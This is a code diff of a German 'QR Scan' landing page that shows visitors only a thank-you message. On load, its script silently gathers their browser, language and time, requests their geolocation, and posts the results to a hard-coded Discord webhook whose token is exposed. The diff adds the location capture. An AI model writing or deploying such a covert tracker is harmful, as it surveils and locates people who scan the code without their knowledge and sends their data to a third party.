@@ -1,43 +1,61 @@
-// https://discord.com/api/webhooks/1459180864901742593/Mj78fxKbGMIjH_qHELRexvyGi-WRRVIEB01O1MnQRcTc91B66v0RS3eHc1HSUWrE2Iaz
-
 <!DOCTYPE html>
 <html lang="de">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>QR Scan</title>
+  <style>
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      text-align: center;
+      font-family: sans-serif;
+    }
+    h1 {
+      font-size: 2rem;
+      color: #333;
+    }
+  </style>
 </head>
 <body>
 <h1>Danke fürs Scannen!</h1>
 
 <script>
 (async () => {
-  // === Discord Webhook URL hier eintragen ===
   const WEBHOOK_URL = "https://discord.com/api/webhooks/1459180864901742593/Mj78fxKbGMIjH_qHELRexvyGi-WRRVIEB01O1MnQRcTc91B66v0RS3eHc1HSUWrE2Iaz";
 
-  // Informationen sammeln
-  const data = {
-    content: "📱 QR-Code wurde gescannt!",
-    embeds: [{
-      title: "QR-Scan Information",
-      color: 7506394, // optional: Farbe
-      fields: [
-        { name: "🕒 Zeit", value: new Date().toLocaleString(), inline: true },
-        { name: "🌐 Browser / OS", value: navigator.userAgent, inline: true },
-        { name: "🌍 Sprache", value: navigator.language || "unbekannt", inline: true }
-      ]
-    }]
-  };
+  function sendDiscord(lat, lon) {
+    const data = {
+      content: "📱 QR-Code wurde gescannt!",
+      embeds: [{
+        title: "QR-Scan Information",
+        color: 7506394,
+        fields: [
+          { name: "🕒 Zeit", value: new Date().toLocaleString(), inline: true },
+          { name: "🌐 Browser / OS", value: navigator.userAgent, inline: true },
+          { name: "🌍 Sprache", value: navigator.language || "unbekannt", inline: true },
+          { name: "📍 Standort", value: lat && lon ? `Lat: ${lat}, Lon: ${lon}` : "Nicht verfügbar", inline: true }
+        ]
+      }]
+    };
 
-  try {
-    const response = await fetch(WEBHOOK_URL, {
+    fetch(WEBHOOK_URL, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify(data)
-    });
-    if (!response.ok) console.error("Fehler beim Senden an Discord:", response.statusText);
-  } catch (err) {
-    console.error("Fehler beim Fetch:", err);
+    }).catch(err => console.error("Fehler beim Senden an Discord:", err));
+  }
+
+  // Geolocation automatisch abfragen
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+      pos => sendDiscord(pos.coords.latitude, pos.coords.longitude),
+      err => sendDiscord(null, null) // falls Nutzer ablehnt
+    );
+  } else {
+    sendDiscord(null, null); // Geolocation nicht verfügbar
   }
 })();
 </script>
